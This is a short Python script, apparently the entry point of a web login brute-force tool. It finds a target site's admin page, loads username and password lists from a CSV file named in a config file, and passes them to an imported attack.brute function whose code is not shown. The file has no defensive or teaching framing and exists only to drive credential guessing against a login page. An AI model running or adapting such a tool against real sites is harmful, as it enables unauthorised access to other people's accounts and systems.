import attack
import WebInfo
import yaml
import pandas
class LoginBrute:

    def __init__(self, ):
        print("#########################################\n\n")


        with open("config.yml", 'r') as ymlfile:
            args = yaml.safe_load(ymlfile)
        
        # args = [{str(j): str(i) for i, j in enumerate(d)} for d in cfg]
        
        url = WebInfo.get_admin_page(args['url'])
        
        try:

            pass_user = pandas.read_csv(args['pass_user'])  
        
        except IOError as e:
            print('File ' + args['pass_user'] + ' not found')
        
        print(str(pass_user))
        
        args['user_list'] = pass_user['Usernames']
        args['passwords'] = pass_user['Passwords']

        args['url'] = url
        pass_list_len = len(args['passwords'])
        passwords = args['passwords']
        attack.brute(args, passwords)


LoginBrute()
